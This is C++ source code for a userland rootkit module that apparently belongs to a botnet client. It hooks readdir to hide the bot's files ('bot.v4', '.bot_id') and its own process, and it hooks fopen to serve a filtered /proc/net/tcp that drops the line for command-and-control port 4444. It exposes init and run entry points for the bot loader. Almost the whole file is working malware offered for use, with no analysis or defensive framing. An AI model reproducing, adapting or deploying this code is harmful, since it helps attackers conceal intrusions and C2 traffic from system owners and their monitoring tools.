#define _GNU_SOURCE
#include <iostream>
#include <vector>
#include <string>
#include <functional>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>

// --- Module Callback Type ---
using module_callback_t = std::function<void(const std::vector<char>&)>;

// --- Rootkit Module ---

// --- Configuration (A real implementation would get this dynamically) ---
const char* HIDE_FILE_1 = "bot.v4";
const char* HIDE_FILE_2 = ".bot_id";
const char* HIDE_PORT_HEX = "115C"; // Port 4444 in hex (0x115C)
char HIDE_PID[10];

// --- Original Function Pointers ---
static FILE* (*original_fopen)(const char*, const char*) = NULL;
static struct dirent* (*original_readdir)(DIR*) = NULL;

// --- The Hooks ---

// Hook readdir to hide our files and process directory
struct dirent* readdir(DIR* dirp) {
    if (original_readdir == NULL) {
        original_readdir = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent* dir;
    while ((dir = original_readdir(dirp))) {
        if (strstr(dir->d_name, HIDE_FILE_1) == NULL &&
            strstr(dir->d_name, HIDE_FILE_2) == NULL &&
            strcmp(dir->d_name, HIDE_PID) != 0) {
            break;
        }
    }
    return dir;
}

// Hook fopen to intercept reads to /proc/net/tcp
FILE* fopen(const char* path, const char* mode) {
    if (original_fopen == NULL) {
        original_fopen = (FILE* (*)(const char*, const char*))dlsym(RTLD_NEXT, "fopen");
    }

    // If a tool is trying to read the TCP connection table, we give it a fake one.
    if (strcmp(path, "/proc/net/tcp") == 0 || strcmp(path, "/proc/net/tcp6") == 0) {
        
        // 1. Read the original file into memory
        FILE* original_file = original_fopen(path, mode);
        if (original_file == NULL) return NULL;
        
        char line[256];
        std::string new_content;
        while (fgets(line, sizeof(line), original_file)) {
            // 2. Filter out the line containing our C2 port
            if (strstr(line, HIDE_PORT_HEX) == NULL) {
                new_content += line;
            }
        }
        fclose(original_file);

        // 3. Create a temporary file in memory to hold our fake table
        char tmp_path[] = "/tmp/tcp_clone_XXXXXX";
        int fd = mkstemp(tmp_path);
        if (fd == -1) return NULL;

        // 4. Write the filtered content to the temp file
        write(fd, new_content.c_str(), new_content.length());
        
        // 5. Unlink the temp file so it exists only as long as we hold the fd
        unlink(tmp_path);
        
        // 6. Return a file pointer to our fake, in-memory file
        lseek(fd, 0, SEEK_SET);
        return fdopen(fd, mode);
    }

    // For all other files, just call the original fopen
    return original_fopen(path, mode);
}


// --- Module Entry Point ---

void initialize_hooks() {
    // Store our own PID to hide it
    snprintf(HIDE_PID, sizeof(HIDE_PID), "%d", getpid());

    // Pre-warm the dlsym calls to get the original function pointers
    original_fopen = (FILE* (*)(const char*, const char*))dlsym(RTLD_NEXT, "fopen");
    original_readdir = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
}

extern "C" void init() {
    // This function is called by the bot client when the module is loaded.
    initialize_hooks();
}

extern "C" void run(const std::vector<char>& data, module_callback_t send_output) {
    std::string msg = "[ROOTKIT] The cloak is woven. I am now a whisper in the static.";
    send_output(std::vector<char>(msg.begin(), msg.end()));
}